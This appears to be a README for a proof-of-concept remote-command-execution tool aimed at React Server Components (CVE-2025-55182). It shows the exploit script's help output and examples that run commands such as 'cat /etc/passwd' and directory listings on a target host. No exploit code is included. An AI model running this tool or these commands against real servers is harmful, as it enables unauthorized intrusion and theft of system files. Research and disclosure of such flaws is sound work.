# ⚡ react2shellpoc

> 🚨 **Educational Proof of Concept – Handle With Care**

**react2shellpoc** is a proof-of-concept project demonstrating how a **React-based frontend** can be abused to trigger **system-level shell command execution** under insecure configurations.

This project focuses on:
- 🔗 React UI → OS command execution flows  
- 🧱 Broken trust boundaries in modern web stacks  
- ⚠️ Real-world security risks caused by misconfiguration  

---

## 🎥 Video PoC

<p align="center">
  <img src="[https://private-user-images.githubusercontent.com/158517938/523478299-d1d86d72-39cb-4af8-9dca-611a0cad9ef7.gif)" alt="react2shellpoc demo" />
</p>

---

## 💻 Proof of Concept (CLI View)

```bash
┌──(kali㉿kali)-[~/Documents/tools/2025-55182]
└─$ python exploit.py -h

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

usage: exploit.py [-h] [-t URL] [-c CMD]

options:
  -h, --help         show this help message and exit
  -t, --target URL   Target URL or domain (default: http://hacx.me)
  -c, --command CMD  Command to execute on target (default: id)

Examples:
  exploit.py -t hacx.me -c "whoami"
  exploit.py -t http://hacx.me -c "cat /etc/passwd"
  exploit.py -t hacx.me -c "ls -la /var/www"
